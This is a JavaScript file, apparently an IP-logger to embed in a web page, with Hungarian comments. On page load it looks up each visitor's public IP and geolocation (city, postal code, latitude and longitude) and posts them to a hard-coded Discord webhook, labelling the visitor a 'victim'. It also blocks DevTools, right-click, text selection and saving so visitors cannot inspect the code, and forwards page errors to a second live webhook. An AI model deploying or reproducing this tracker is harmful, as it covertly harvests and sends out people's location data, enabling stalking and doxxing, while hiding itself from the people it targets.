const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1400426279408500807/4VGOn9kW4kH-dk7hzb2gWr_D5SVAtj997UtXKf-LSayhf-X-8uUbzVD-rYwe-1JpCzN7'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "site logger <3", // optionally changeable
                            avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'A victim clicked on the link!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();

// Prevent DevTools and Ctrl+S
// DevTools blokkolása
let devtoolsDetected = false;
const redirectURL = 'https://example.com';  // Cseréld ki arra az oldalra, ahová át szeretnéd irányítani

// DevTools érzékelése a `console.log` manipulálásával (mobil eszközökre is alkalmazható)
(function() {
    const originalConsole = console.log;
    console.log = function(...args) {
        originalConsole.apply(console, args); // Még mindig logoljuk a konzolra
        if (args[0].includes('DevTools') || args[0].includes('DevTools protocol')) {
            window.location.href = redirectURL;  // Ha a DevTools elérhető, átirányítjuk őket
        }
    };
})();

// DevTools érzékelése az ablak méretének változásával (mobil eszközökre is alkalmazható)
function detectDevTools() {
    const threshold = 200;  // Ha a külső magasság eltérése nagyobb, mint 200px, akkor DevTools megnyílt
    const devtoolsOpen = window.outerHeight - window.innerHeight > threshold;
    if (devtoolsOpen && !devtoolsDetected) {
        devtoolsDetected = true;
        window.location.href = redirectURL;  // Ha megnyílt, átirányítjuk őket
    }
}

setInterval(detectDevTools, 1000); // Minden másodpercben ellenőrzi a DevTools állapotát

// Ha valaki próbálja a DevTools-t vagy a jobb kattintást, letiltjuk
document.addEventListener('keydown', function(e) {
    // Ha a felhasználó "Ctrl+S"-t nyom, letiltjuk
    if ((e.ctrlKey && e.key === 's') || e.key === 'F12') {
        e.preventDefault();  // Letiltja az alapértelmezett viselkedést (mentés)
        window.location.href = redirectURL;  // Átirányítjuk őket a kívánt oldalra
    }
});

// Jobb kattintás letiltása
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();  // Letiltja a jobb kattintást
});

// Szövegkiválasztás letiltása
document.addEventListener('selectstart', function(e) {
    e.preventDefault();  // Letiltja a szövegkiválasztást
});

// Globális hibafigyelés
window.onerror = function(message, source, lineno, colno, error) {
    console.error(`Hiba: ${message} a(z) ${source} fájlban ${lineno} sorban észlelve.`);
    
    // Hibaüzenet megjelenítése a felhasználónak
    const errorContainer = document.createElement('div');
    errorContainer.classList.add('error');
    errorContainer.innerText = `Hiba történt: ${message}`;

    document.body.appendChild(errorContainer);

    // Hibát küldhetünk Discordra
    const dscURL = 'https://discord.com/api/webhooks/1397140201008267375/OigaJ4FR510_5ExJAanLzDF0VKx-vnmNSEtpxbphhuQLizgB781VzCCR0o2Bp5l5SvX3';
    fetch(dscURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            content: `Hiba történt a weboldalon: ${message}`
        })
    })
    .then(response => response.json())
    .then(data => console.log('Hiba sikeresen küldve Discordra:', data))
    .catch(error => console.error('Hiba küldése Discordra nem sikerült:', error));

    return true;  // Elkerüli a hiba dupla megjelenítését
};
